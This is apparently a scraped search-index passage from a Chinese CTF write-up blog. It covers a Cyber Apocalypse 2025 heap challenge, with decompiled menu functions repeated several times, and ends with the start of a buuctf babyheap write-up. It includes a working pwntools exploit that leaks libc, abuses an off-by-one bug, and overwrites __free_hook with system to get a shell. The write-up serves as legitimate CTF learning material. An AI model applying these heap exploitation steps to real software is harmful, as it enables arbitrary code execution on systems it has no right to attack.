elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#menu"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#create-plan"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#show-plan"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#edit-plan"},{"categories":["WP"],"content":"\r逆向分析\rmenu __int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#delete-plan"},{"categories":["WP"],"content":"\r思路覆盖free_hook(发现覆盖malloc_hook为one_gadget都不行) 泄露libc。 先申请一个大于tcache范围的块，再申请一个块，防止前一个chunk与topchunk合并 然后free掉第一个chunk， 再重新申请出来，并把用户区里的libc地址edit出来，计算libc地址。 覆盖free_hook 利用off-by-one改大其中一个块，再申请出来，覆盖掉下一个chunk的内容 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:2","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路-2"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './strategist' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) one_gadget = [0x10a41c,0x4f3ce,0x4f3d5,0x4f432] def create(long,plan): p.sendlineafter(b'\u003e ',b'1') p.sendlineafter(b'\u003e ',str(long)) p.sendafter(b'\u003e ',plan) def show(number): p.sendlineafter(b'\u003e ',b'2') p.sendlineafter(b'\u003e ',str(number)) def edit(number,plan): p.sendlineafter(b'\u003e ',b'3') p.sendlineafter(b'\u003e ',str(number)) p.sendafter(b'\u003e ',plan) def delete(number): p.sendlineafter(b'\u003e ',b'4') p.sendlineafter(b'\u003e ',str(number)) pl = b'aaaa' create(0x500,pl) create(0x100,pl) delete(0) delete(1) create(0x500,b'a') show(0) # leak libc base addr p.recvuntil(b'Plan [0]: a') libc_addr = u64(p.recv(5).rjust(8,b'\\x00')) libc_addr = libc_addr \u003e\u003e 16 libc_base_addr = libc_addr-0x733efa3ebc00+0x733efa000000 success(\"libc_base_addr ----\u003e 0x%x\",libc_base_addr) libc.address = libc_base_addr delete(0) malloc_hook_addr = libc_base_addr + 0x3EBC30 one_gadget_addr = one_gadget[0] + libc_base_addr create(0x48,b'a'*0x48) create(0x48,b'b'*0x48) create(0x48,b'c'*0x48) edit(0,b'w'*0x48+p8(0x80)) delete(1) delete(2) create(0x70, b'6'*0x50 + p64(libc.sym.__free_hook)) create(0x40, b'/bin/sh\\x00') create(0x40, p64(libc.sym.system)) delete(2) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:3","series":null,"tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-4"},{"categories":["WP"],"content":"\rTip\r一些在buu刷过的heap题，不想放在笔记里，就放这里了\r","date":"2025-05-30","objectID":"/posts/buuctf_heap/:0:0","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#"},{"categories":["WP"],"content":"\r0ctf2017_babyheap2.23的堆，保护全开 ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:1:0","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#0ctf2017_babyheap"},{"categories":["WP"],"content":"\r逆向分析 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { __int64 baby_addr; // [rsp+8h] [rbp-8h] baby_addr = initial(a1, a2, a3); while ( 1 ) { menu(); switch ( read_num() ) { case 1LL: Allocate(baby_addr); break; case 2LL: Fill(baby_addr); break; case 3LL: Free(baby_addr); break; case 4LL: Dump(baby_addr); break; case 5LL: return 0; default: continue; } } } 初始化函数 char *initial() { int fd; // [rsp+4h] [rbp-3Ch] char *addr; // [rsp+8h] [rbp-38h] unsigned __int64 v3; // [rsp+10h] [rbp-30h] _QWORD buf[4]; // [rsp+20h] [rbp-20h] BYREF buf[3] = __readfsqword(0x28u); setvbuf(stdin, 0, 2, 0); setvbuf(_bss_start, 0, 2, 0); alarm(0x3Cu); puts(\"===== Baby Heap in 2017 =====\"); fd = open(\"/dev/urandom\", 0); if ( fd \u003c 0 || read(fd, buf, 0x10u) != 16 ) // 获取长度为16的随机数 exit(-1); close(fd); addr = (char *)((buf[0] % 0x555555543000uLL + 0x10000) \u0026 0xFFFFFFFFFFFFF000LL);// 对buf一顿操作，然后给addr v3 = (buf[1] % 0xE80uLL) \u0026 0xFFFFFFFFFFFFFFF0LL; if ( mmap(addr, 0x1000u, 